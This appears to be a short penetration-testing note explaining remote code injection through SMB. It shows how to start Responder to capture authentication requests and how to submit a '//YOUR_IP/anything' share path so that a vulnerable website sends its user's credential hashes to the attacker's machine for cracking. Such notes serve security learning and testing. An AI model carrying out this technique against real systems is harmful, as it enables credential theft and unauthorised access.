A [remote code injection](https://owasp.org/www-community/attacks/Code_Injection) (RCI) is an attack in which a hacker inject malicious code inside an application.

For instance, a website may be using SMB to access some shares based on the user input. If we inject a share leading to our machine, we may be able to grab credentials.

First set up [responder](https://github.com/lgandx/Responder) to catch authentication requests:

```ps
$ sudo responder -i IP -I tun0
```

Submit: `//YOUR_IP/anything`. If the website was configured to use the current user credentials to connect to the share, then you will receive them, and will have to crack them.
